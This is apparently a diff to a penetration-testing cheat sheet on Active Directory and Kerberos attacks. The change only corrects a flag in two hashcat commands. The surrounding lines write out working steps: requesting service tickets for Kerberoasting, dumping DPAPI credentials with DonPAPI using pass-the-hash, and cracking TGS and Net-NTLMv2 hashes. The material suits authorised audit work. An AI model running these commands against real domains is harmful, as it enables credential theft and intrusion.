@@ -94,7 +94,7 @@ KERBEROS
 - GetUsersSPNs.py -request -dc-ip <IP-DC> <domain.local>/<USER> -outputfile impacket_TGS_<IP>.txt
 
 # Crack TGS
-- hashcat -m 13100 hash.txt /home/audit/Documents/french -r d3adhob0.rule -O -w 3t
+- hashcat -m 13100 hash.txt /home/audit/Documents/french -r d3adhob0.rule -O -w 3
  
 ```
 ```markdown
@@ -104,7 +104,7 @@ KERBEROS
 - python3 DonPAPI.py --hashes <LM>:<NT> domain/user@target OR DonPAPI.py domain/user:passw0rd@target
 
 # Net-NTLMv2 hash cracking
--  hashcat -m 5600 hash.txt /home/audit/Documents/french -r d3adhob0.rule -O -w 3t
+-  hashcat -m 5600 hash.txt /home/audit/Documents/french -r d3adhob0.rule -O -w 3
  
 ```
 
